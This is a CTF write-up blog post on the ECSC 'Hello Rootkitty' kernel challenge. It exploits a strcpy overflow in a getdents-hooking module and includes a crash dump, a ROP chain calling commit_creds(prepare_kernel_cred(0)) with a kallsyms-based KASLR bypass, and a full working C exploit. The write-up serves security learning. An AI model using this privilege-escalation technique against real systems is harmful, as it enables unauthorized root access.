---
title: "Hello Rootkitty"
date: 2020-05-07T18:03:45+02:00
categories:
- write-ups
- ecsc
tags:
- pwn
- kernel
keywords:
- pwn
- kernel
- rop
coverImage: /images/HelloRootkitty/root1.png
coverSize: full
coverMeta: in
metaAlignment: center
autoThumbnailImage: false
summary : "Write-up about the kernel exploit challenge from the ecsc qualification."
---

|  Event | Challenge | Category | Points | Solves |
|:----------:|:------------:|:------------:|:------------:|:------------:|
| ecsc |  Hello Rootkitty  |  pwn  |  500 |  24  |


# TL;DR

A custom kernel module was vulnerable to a buffer overflow, with a small ropchain I escalated my privileges to root and with a sys_chmod syscalls I got the flag.

# Description 

{{< image classes="fancybox center clear" src="/images/HelloRootkitty/description.png" thumbnail="/images/HelloRootkitty/description.png" thumbnail-width="50%" thumbnail-height="50%">}}

# Recon

I'm not a Linux kernel expert, everything might not be 100% correct, but I'll do my best to summarize what I understood.

We were provided with 3 files, a bzImage, an iniramfs and a custom kernel module. I tried to run everything locally with qemu, but It didn’t work as the provided initramfs was broken, so let's run the virtual machine on the server and see what happens.


{{< image classes="fancybox center clear" src="/images/HelloRootkitty/root.png" thumbnail="/images/HelloRootkitty/root.png" >}}

It seems that the flag is located in the root directory, but the *XXXX* are a bit weird. We can create files and see what append inside the home folder of the current user:

{{< codeblock lang="bash"  >}}
~ $ touch ecsc_flag_aaaa
~ $ ls -asl
total 0
     0 drwxrwxrwx    2 ctf      ctf              0 May  7 15:55 .
     0 drwxr-xr-x    3 root     root             0 Feb 25 09:30 ..
     0 -r--------    0 root     root             0 Jan  0  1900 ecsc_flag_XXXX
~ $ touch ecsc_flag_bbbb
~ $ ls -asl
total 0
     0 drwxrwxrwx    2 ctf      ctf              0 May  7 15:56 .
     0 drwxr-xr-x    3 root     root             0 Feb 25 09:30 ..
     0 -r--------    0 root     root             0 Jan  0  1900 ecsc_flag_XXXX
     0 -r--------    0 root     root             0 Jan  0  1900 ecsc_flag_aaaa
{{< /codeblock >}}

It looks like the permission on files starting by ecsc\_flag\_ are modified.

## Static analysis

Let's load the kernel module inside {{< hl-text orange >}}Ghidra{{< /hl-text >}} and search for interesting things. The module is not so big we can quickly spot what's going on, the {{< hl-text orange >}}init_module{{< /hl-text >}} function is responsible for the initialization of this custom module. 

{{< image classes="fancybox center clear" src="/images/HelloRootkitty/init_module.png" thumbnail="/images/HelloRootkitty/init_module.png" >}}

</br>

The module replaces the addresses of the original {{< hl-text orange >}}sys_getdents64{{< /hl-text >}}, {{< hl-text orange >}}sys_getdents{{< /hl-text >}} and {{< hl-text orange >}}sys_lstat{{< /hl-text >}} addresses by custom addresses which are functions inside the module. The module is hooking legit function by a custom one. From the Linux man page we can read:

{{< pullquote >}}
getdents, getdents64 - get directory entries
{{< /pullquote >}}

When we want to list entries in a directory this syscall is made and instead of the original one the Linux kernel will call the custom one. Here is a part of the custom sys_getdents function:

{{< image classes="fancybox center clear" src="/images/HelloRootkitty/vuln.png" thumbnail="/images/HelloRootkitty/vuln.png" >}}

We can spot a {{< hl-text orange >}}strcpy{{< /hl-text >}} with only 2 parameters which means a buffer overflow if we can control the second parameter. The second parameter comes from the second parameter of the sys_getdents function. Once again from the Linux man page:

{{< codeblock lang="c"  >}}
int getdents(unsigned int fd, struct linux_dirent *dirp,
                    unsigned int count);
int getdents64(unsigned int fd, struct linux_dirent64 *dirp,
                    unsigned int count);
{{< /codeblock >}}

The second parameter is a pointer to a {{< hl-text orange >}}linux_dirent{{< /hl-text >}} structure. Here is the definition of such a structure:

{{< codeblock lang="c"  >}}
struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                        /* length is actually (d_reclen - 2 -
                        offsetof(struct linux_dirent, d_name)) */
    /*
    char           pad;       // Zero padding byte
    char           d_type;    // File type (only since Linux
                                // 2.6.4); offset is (d_reclen - 1)
    */
}
{{< /codeblock >}}

So at the offset 0x12 of a linux_dirent structure we can find the {{< hl-text orange >}}d_name{{< /hl-text >}} parameter. The little loop before the strcpy checks that the name of the file starts by {{< hl-text orange >}}ecsc_flag_{{< /hl-text >}}. We can try a buffer overflow with a long filename starting by ecsc\_flag\_ and see what append:

{{< codeblock lang="bash"  >}}
~ $ touch ecsc_flag_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
~ $ ls -asl
general protection fault: 0000 [#1] NOPTI
Modules linked in: ecsc(O)
CPU: 0 PID: 63 Comm: ls Tainted: G           O    4.14.167 #11
task: ffff9f6281e19100 task.stack: ffffb61dc009c000
RIP: 0010:0x6161616161616161
RSP: 0018:ffffb61dc009ff38 EFLAGS: 00000282
RAX: 0000000000000170 RBX: 6161616161616161 RCX: 0000000000000000
RDX: 00007ffd2cdac8a9 RSI: ffffb61dc009ff96 RDI: 00007ffd2cdac7d3
RBP: 6161616161616161 R08: ffffb61dc009fed0 R09: ffffffffc0387024
R10: ffffb61dc009fec0 R11: 6161616161616161 R12: 6161616161616161
R13: 6161616161616161 R14: 0000000000000000 R15: 0000000000000000
FS:  0000000000000000(0000) GS:ffffffff88a36000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007ffd2cdac790 CR3: 0000000001e72000 CR4: 00000000000006b0
Call Trace:
Code:  Bad RIP value.
RIP: 0x6161616161616161 RSP: ffffb61dc009ff38
---[ end trace f622400f5523341b ]---
Kernel panic - not syncing: Fatal exception
Kernel Offset: 0x7000000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
Rebooting in 1 seconds..
{{< /codeblock >}}

A kernel stack trace with {{< hl-text orange >}}RIP: 0010:0x6161616161616161{{< /hl-text >}}, we have full control over RIP we can start building our exploit.

# Ropping through hell

I though that it would be easy from here, but I actually spent a lot of time finding a good strategy to execute some privileged actions. My idea was initially to pop a root shell, let's see the different steps to get there. First I tried to map a userland region as rwx and execute a custom shellcode from there, but I don't know why It didn't work. So I decided to build a ropchain. 

In order to elevate our privileges, we have to call these functions in kernel-land:

{{< codeblock lang="c"  >}}
commit_creds(prepare_kernel_cred(0));
{{< /codeblock >}}

This will grant us root privileges which means that we will theoretically be able to do whatever we want on the system. To call these functions we need to know their addresses, {{< hl-text orange >}}kaslr{{< /hl-text >}} is enabled, but we can read {{< hl-text orange >}}/proc/kallsym{{< /hl-text >}} which holds all the kernel function addresses and their current offset, thus defeating kaslr.

Here is a useful function to get kernel addresses base on the symbol name :

{{< codeblock lang="c"  >}}
unsigned long get_kernel_sym(char *name) {
    FILE *f;
    unsigned long addr;
    char dummy;
    char sname[256];
    int ret = 0;


    f = fopen("/proc/kallsyms", "r");
    if (f == NULL) {
        printf("[-] Failed to open /proc/kallsyms\n");
        exit(-1);
    }
    printf("[+] Find %s...\n", name);
    while(ret != EOF) {
        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
        if (ret == 0) {
            fscanf(f, "%s\n", sname);
            continue;
        }
        if (!strcmp(name, sname)) {
            fclose(f);
            printf("[+] Found %s at %lx\n", name, addr);
            return addr;
        }
    }
    fclose(f);
    return 0;
}
{{< /codeblock >}}

We can now compute the addresses of those functions, but we need gadgets, and there are not so many gadgets inside the kernel module. To get more gadgets I extracted the vmlinux from the bzImage with this [tool](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux). Then we can launch ROPgadet on the vmlinux and get a lot of them. Here is the beginning of my ropchain:

{{< codeblock lang="c"  >}}
int main() {
 
    int fd, nread;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    char file_name[138] = "/home/ctf/ecsc_flag_AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQQRRRRSSSSTTTTUUUUVVVVWWWWWXXXXYYYY";
    char *p;
    void *payload;
    unsigned long  kernel_base, *fake_stack;

    kernel_base = get_kernel_sym("startup_64"); // get the kernel base address to compute real gadget address
    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym("prepare_kernel_cred");
    commit_creds = (commit_creds_t)get_kernel_sym("commit_creds");

    payload = malloc(0x100);
    memset(payload, 0x00, 0x100);

    fake_stack = (unsigned long *)(payload);
    *fake_stack ++= kernel_base + 0x2d028f;           // xor rax, rax

    *fake_stack ++= kernel_base + 0x1cc22e;           //pop rcx; ret
    *fake_stack ++= prepare_kernel_cred;
    
    *fake_stack ++= kernel_base + 0xa3247;           //mov rdi, rax ; call rcx

    *fake_stack ++= 0x4343434343434343;
    
    *fake_stack ++= kernel_base + 0x1cc22e;          //pop rcx; ret
    *fake_stack ++= commit_creds;
    
    *fake_stack ++= kernel_base + 0xa3247;          // mov rdi, rax ; call rcx

    [...]
{{< /codeblock >}}

After those gadget are executed, we will get root privileges. My naive idea was just to go back to a userland function and execute system("/bin/sh") but it didn't work as expected. I triggered segfault and I could only execute one printf then it would failed with a segfault. 

I successfully executed a printf which means that I still can execute code but not for long. I tried to execute a custom minimal shellcode to call execve('/bin/sh') but without success. I was probably messing up with the kernel stack so I either had to restore it or find another solution. I tried in vain to restore it and I also tried to make a stack pivot but without sucess.

I also tried to execute a call to exit after the ropchain, it worked but printf and exit are pretty useless in our case. But something is happening, we can still make at least one syscall, what can we do with one sycall ? 

# One syscall to rule them all

I used the sys_chmod sycall and It worked, no root shell but a root directory with rwx permission for everybody. I also tried to put the suid bit on /bin/sh but it didn't work. 

First a syscall to chmod:

- syscall(SYS_chmod, "/", 0777);

Then I created a file starting by ecsc\_flag\_ inside the root folder to get the real name of the flag and then we can get the flag:

{{< image classes="fancybox fig-50" src="/images/HelloRootkitty/root2.png" thumbnail="/images/HelloRootkitty/root2.png" >}}

{{< image classes="fancybox fig-50 clear" src="/images/HelloRootkitty/root1.png" thumbnail="/images/HelloRootkitty/root1.png" >}}

# Final thought

I saw other write-ups where people simply unloaded the kernel module and then printed the flag which is simpler and less painful. I really wanted a root shell but I don't know why It didn't work since there is no SMEP or SMAP protection if someone has any idea please send me a message :)

# Full exploit

{{< codeblock lang="c"  >}}
// gcc exploit.c -static -o exploit

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <time.h>
#include <sys/ioctl.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/syscall.h>
#include <assert.h>

#define BUF_SIZE 1024

struct cred;
struct task_struct;

struct linux_dirent {
           long           d_ino;
           off_t          d_off;
           unsigned short d_reclen;
           char           d_name[];
};


typedef struct cred *(*prepare_kernel_cred_t) (struct task_struct *daemon) __attribute__((regparm(3)));
typedef int (*commit_creds_t) (struct cred *new) __attribute__((regparm(3)));


prepare_kernel_cred_t   prepare_kernel_cred;
commit_creds_t    commit_creds;

static void
kernel_code(void)
{
    commit_creds(prepare_kernel_cred(0));
    syscall(SYS_chmod, "/", 0777);
    exit(0);
}


unsigned long get_kernel_sym(char *name) {
    FILE *f;
    unsigned long addr;
    char dummy;
    char sname[256];
    int ret = 0;


    f = fopen("/proc/kallsyms", "r");
    if (f == NULL) {
        printf("[-] Failed to open /proc/kallsyms\n");
        exit(-1);
    }
    printf("[+] Find %s...\n", name);
    while(ret != EOF) {
        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
        if (ret == 0) {
            fscanf(f, "%s\n", sname);
            continue;
        }
        if (!strcmp(name, sname)) {
            fclose(f);
            printf("[+] Found %s at %lx\n", name, addr);
            return addr;
        }
    }
    fclose(f);
    return 0;
}


int main() {

    int fd, nread;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    char file_name[138] = "/home/ctf/ecsc_flag_AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQQRRRRSSSSTTTTUUUUVVVVWWWWWXXXXYYYY";
    char *p;
    void *payload;

    unsigned long base_addr, stack_addr, mmap_addr, *fake_stack, *fake_stack2;

    unsigned long kernel_base, sys_chmod;

    kernel_base = get_kernel_sym("startup_64");

    prepare_kernel_cred = (prepare_kernel_cred_t)get_kernel_sym("prepare_kernel_cred");
    commit_creds = (commit_creds_t)get_kernel_sym("commit_creds");


    payload = malloc(0x100);
    memset(payload, 0x00, 0x100);

    fake_stack = (unsigned long *)(payload);

    *fake_stack ++= kernel_base + 0x1c251;           //pop rax ; ret
    *fake_stack ++= 0x4141414141414141;

    *fake_stack ++= kernel_base + 0x1cc22e;          //pop rcx ; ret
    *fake_stack ++= (0x4141414141414141 ^ (unsigned long)kernel_code);
                                                    // can't send null bytes xoring address

    *fake_stack ++= kernel_base + 0x2c9efc;          // xor rax, rcx ; ret


    *fake_stack ++= kernel_base + 0x230bf6;         //push rsi ; call rax


    memcpy(file_name + 122, payload, 0x100);
    puts(file_name);


    fd = open(file_name, O_RDWR|O_CREAT, 0777);
    close(fd);


    fd = open("/home/ctf/", O_RDONLY | O_DIRECTORY);
    nread = syscall(SYS_getdents, fd, buf, BUF_SIZE);

    return 0;
}

{{< /codeblock >}}